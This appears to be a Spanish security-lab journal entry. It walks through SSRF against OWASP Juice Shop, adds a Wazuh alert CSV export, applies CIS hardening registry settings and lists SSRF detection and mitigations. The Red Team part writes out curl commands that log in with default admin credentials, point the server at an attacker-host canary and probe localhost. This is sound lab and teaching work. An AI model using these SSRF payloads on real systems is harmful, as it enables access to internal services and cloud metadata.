# Día 26 — SSRF + CSV Export + CIS Hardening

**Fecha:** Abril 2026  
**MITRE:** T1190  
**Target:** OWASP Juice Shop

---

## Teoría

### SSRF — Server Side Request Forgery
SSRF es una vulnerabilidad donde el atacante hace que el servidor haga requests HTTP en su nombre. En lugar de que el atacante haga el request directamente desde su PC, el servidor lo hace — accediendo a recursos internos que el atacante no podría alcanzar directamente.

```
Sin SSRF:
Atacante → ❌ → Servicio interno (firewall lo bloquea)

Con SSRF:
Atacante → Servidor vulnerable → Servicio interno ✅
```

**¿Por qué es peligroso?**
- Acceder a servicios internos no expuestos (bases de datos, APIs internas)
- Leer metadata de instancias cloud (AWS, Azure, GCP en `169.254.169.254`)
- Escanear la red interna desde el servidor
- Bypassear firewalls

**Casos reales:**
- **Capital One (2019)** — SSRF en WAF mal configurado → 100M cuentas robadas, multa $80M
- **GitHub (2018)** — SSRF para acceder a servicios internos → bug bounty $25K
- **MS Exchange ProxyLogon (2021)** — Cadena con SSRF → miles de servidores comprometidos

---

## Red Team

### Sección 1 — Identificar endpoint vulnerable

DVWA no tiene módulo SSRF — usamos OWASP Juice Shop.

**Login como admin:**
```bash
curl -s -X POST "http://192.168.1.96:3000/rest/user/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}'
# → JWT token de admin obtenido
```

**Buscar endpoints que reciban URLs:**
```bash
curl -s "http://192.168.1.96:3000/profile" \
  -b "token=$TOKEN" | grep -i "image\|url\|input"
```

**Endpoint vulnerable identificado:**
```html
<form action="./profile/image/url" method="post">
  <input name="imageUrl" placeholder="https://www.gravatar.com/...">
</form>
```

El servidor acepta una URL del cliente y hace el request por nosotros — patrón clásico de SSRF.

### Sección 2 — Confirmación del SSRF con canary

**Levantar servidor HTTP en Kali:**
```bash
python3 -m http.server 9999
```

**Pedirle a Juice Shop que descargue una imagen desde Kali:**
```bash
curl -s -X POST "http://192.168.1.96:3000/profile/image/url" \
  -b "token=$TOKEN" \
  -d "imageUrl=http://192.168.1.132:9999/marca-ssrf"
```

**Output del servidor HTTP en Kali:**
```
192.168.1.96 - - [26/Apr/2026 10:56:03] "GET /marca-ssrf HTTP/1.1" 404
```

**SSRF CONFIRMADO** ✅ — el request vino de `192.168.1.96` (Ubuntu/Juice Shop), no de Kali. El servidor hizo el request en nuestro nombre.

```
Tú estás en Kali (192.168.1.132)
   ↓
Le pediste a Juice Shop: "descarga http://192.168.1.132:9999/marca-ssrf"
   ↓
Juice Shop hizo el request POR TI desde Ubuntu
   ↓
Servidor en Kali registró: "Hola, soy 192.168.1.96 pidiendo /marca-ssrf"
```

### Sección 3 — Acceso a recursos internos

**Probamos requests a localhost del servidor:**
```bash
curl -s -X POST "http://192.168.1.96:3000/profile/image/url" \
  -b "token=$TOKEN" \
  -d "imageUrl=http://127.0.0.1:3000/" -i | head -5
# → HTTP/1.1 302 Found
```

El servidor aceptó la URL apuntando a `127.0.0.1` — recurso interno que normalmente no podríamos alcanzar desde Kali.

**¿Por qué es peligroso?**

Una app vulnerable es una puerta de entrada a TODO lo que esa app puede ver:
```
Tu servidor:
├── Juice Shop (vulnerable a SSRF)  ← punto de entrada
├── PostgreSQL en localhost:5432    ← el atacante llega aquí
├── Redis en localhost:6379         ← y aquí
├── API admin en localhost:8080     ← y aquí
└── Sistema de archivos              ← y aquí (file:///etc/passwd)
```

---

## App MS Security — Export CSV

Se agregó un botón que exporta las alertas de Wazuh actualmente filtradas a un archivo CSV.

```jsx
const exportToCSV = () => {
  const headers = ["Timestamp", "Agente", "Nivel", "Descripción", "Rule ID"]
  const rows = wazuhFiltered.map(a => [
    a.timestamp?.slice(0, 19).replace("T", " "),
    a.agent,
    a.rule_level,
    `"${(a.description || "").replace(/"/g, '""')}"`,
    a.rule_id
  ])
  
  const csvContent = [headers.join(","), ...rows.map(r => r.join(","))].join("\n")
  const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" })
  const url = URL.createObjectURL(blob)
  const link = document.createElement("a")
  link.href = url
  link.download = `wazuh_alerts_${new Date().toISOString().slice(0, 10)}.csv`
  link.click()
  URL.revokeObjectURL(url)
}
```

**Botón de export:**
```jsx
<button onClick={exportToCSV}>↓ EXPORT CSV</button>
```

El nombre del archivo incluye la fecha actual (`wazuh_alerts_2026-04-26.csv`). Las descripciones llevan comillas dobles para escapar comas dentro del texto.

Los analistas SOC necesitan generar reportes constantemente — esta feature convierte el dashboard en una herramienta de reporte real.

---

## Wazuh — CIS Hardening

Score al inicio: **44%** (210 passed / 264 failed) — subimos de 40% a 44% con el hardening del Día 25.

### Grupo 1 — Auditoría legacy via secedit

Aunque ya configuramos las subcategorías con `auditpol`, Wazuh verifica el sistema legacy via `secedit`. Sincronizamos ambos sistemas.

```powershell
$inf = @"
[Event Audit]
AuditSystemEvents = 3
AuditLogonEvents = 3
AuditObjectAccess = 3
AuditPrivilegeUse = 3
AuditPolicyChange = 3
AuditAccountManage = 3
AuditProcessTracking = 3
AuditAccountLogon = 3
"@

$inf | Out-File "$env:TEMP\audit-policy.inf" -Encoding Unicode
secedit /configure /db "$env:TEMP\audit.sdb" /cfg "$env:TEMP\audit-policy.inf" /areas SECURITYPOLICY
```

`AuditSystemEvents = 3` significa Success + Failure (1=Success, 2=Failure, 3=ambos).

### Grupo 2 — Network Security

```powershell
# Bloquear cuentas Microsoft
Set-ItemProperty -Path "HKLM:\...\Policies\System" -Name "NoConnectedUser" -Value 3

# Reducir logins cacheados a 10
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CachedLogonsCount" -Value "10"

# Validación SPN en SMB — previene relay attacks
Set-ItemProperty -Path "HKLM:\SYSTEM\...\LanmanServer\Parameters" -Name "SmbServerNameHardeningLevel" -Value 1

# Kerberos solo AES — bloquea DES y RC4
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Kerberos\Parameters" -Name "SupportedEncryptionTypes" -Value 2147483640
```

### Grupo 3 — MSS Settings

Mitigaciones contra ataques de red:

```powershell
# IP Source Routing — deshabilitado
Set-ItemProperty -Path "HKLM:\SYSTEM\...\Tcpip\Parameters" -Name "DisableIPSourceRouting" -Value 2

# ICMP Redirects — bloqueados
Set-ItemProperty -Path "HKLM:\SYSTEM\...\Tcpip\Parameters" -Name "EnableICMPRedirect" -Value 0

# IRDP — deshabilitado
Set-ItemProperty -Path "HKLM:\SYSTEM\...\Tcpip\Parameters" -Name "PerformRouterDiscovery" -Value 0

# NetBIOS — modo P-node (point-to-point)
Set-ItemProperty -Path "HKLM:\SYSTEM\...\NetBT\Parameters" -Name "NodeType" -Value 2

# SEHOP — habilitado (previene exploits de buffer overflow)
Set-ItemProperty -Path "HKLM:\SYSTEM\...\Session Manager\kernel" -Name "DisableExceptionChainValidation" -Value 0

# CVE-2013-3900 — validación de firmas digitales
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Cryptography\Wintrust\Config" -Name "EnableCertPaddingCheck" -Value "1"
```

### Grupo 4 — Wireless y Process Monitoring

```powershell
# Windows Connect Now — deshabilitado completamente
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WCN\Registrars" -Name "EnableRegistrars" -Value 0

# Auto-conexión a hotspots WiFi públicos — bloqueada
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\WiFi\..." -Name "value" -Value 0

# Network Bridges prohibidos
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Network Connections" -Name "NC_AllowNetBridge_NLA" -Value 0

# Command line en eventos de creación de procesos — CRÍTICO para detección
Set-ItemProperty -Path "HKLM:\...\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1

# CVE-2018-0886 — CredSSP MITM en RDP
Set-ItemProperty -Path "HKLM:\...\CredSSP\Parameters" -Name "AllowEncryptionOracle" -Value 0
```

`ProcessCreationIncludeCmdLine_Enabled` es especialmente importante para detección — registra la línea de comandos completa con argumentos cuando se crea un proceso. Wazuh puede analizar estos eventos para detectar PowerShell malicioso, scripts ofuscados y ataques living-off-the-land.

---

## Blue Team

### Detección SSRF
- WAF con reglas que detecten IPs internas en parámetros de URL
- Logs del servidor mostrando requests a `127.0.0.1`, `169.254.169.254`, rangos privados
- Wazuh con FIM en logs de la aplicación
- Anomaly detection — la app web normalmente no debería hacer requests a localhost

### Mitigación SSRF
- **Whitelist de URLs** — solo permitir dominios específicos en endpoints que reciben URLs
- **Bloquear IPs internas** — `127.0.0.1`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.169.254`
- **Servicios internos también necesitan autenticación** — no asumir que "está en localhost, es seguro"
- **Network segmentation** — la app web no debería poder hablar con la base de datos admin

---

## Conclusión

SSRF demostró cómo una vulnerabilidad en una app web puede convertirse en una puerta de entrada a toda la red interna del servidor. El canary con `python3 -m http.server` confirmó visualmente que el servidor hace requests por el atacante. Una app vulnerable expone todos los servicios que ese servidor pueda ver — bases de datos, APIs internas, metadata cloud. La defensa requiere defense in depth — whitelist de destinos, bloqueo de IPs internas y autenticación en todos los servicios incluso los "internos". El export CSV convierte el dashboard en una herramienta de reporte real para analistas SOC. El hardening cubrió auditoría legacy, Network Security, MSS settings y monitoreo de procesos — acercándonos al objetivo de 50% CIS.
